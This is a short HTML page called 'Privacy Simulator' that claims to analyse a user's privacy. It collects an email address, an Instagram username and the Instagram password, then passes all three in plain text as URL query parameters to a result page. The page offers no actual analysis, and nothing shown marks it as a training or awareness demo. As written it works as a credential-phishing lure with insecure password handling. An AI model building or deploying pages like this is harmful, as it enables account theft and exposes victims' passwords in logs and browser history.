<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Privacy Simulator</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <!-- Title centered in the container -->
        <h1>Privacy Simulator</h1>

        <!-- Input Boxes -->
        <div class="input-box">
            <input type="email" id="email" placeholder="Enter your email">
            <input type="text" id="instagramAccount" placeholder="Enter your Instagram account">
            <input type="password" id="instagramPassword" placeholder="Enter your Instagram account password">
        </div>

        <!-- Analyze Button -->
        <button onclick="analyzePrivacy()">Analyze Privacy</button>
    </div>

    <script>
        function analyzePrivacy() {
            const email = document.getElementById('email').value;
            const instagramAccount = document.getElementById('instagramAccount').value;
            const instagramPassword = document.getElementById('instagramPassword').value;

            // Ensure data is provided before redirecting
            if (email && instagramAccount && instagramPassword) {
                window.location.href = `result.html?email=${encodeURIComponent(email)}&instagramAccount=${encodeURIComponent(instagramAccount)}&instagramPassword=${encodeURIComponent(instagramPassword)}`;
            } else {
                alert("Please fill in all fields before analyzing.");
            }
        }
    </script>
</body>
</html>
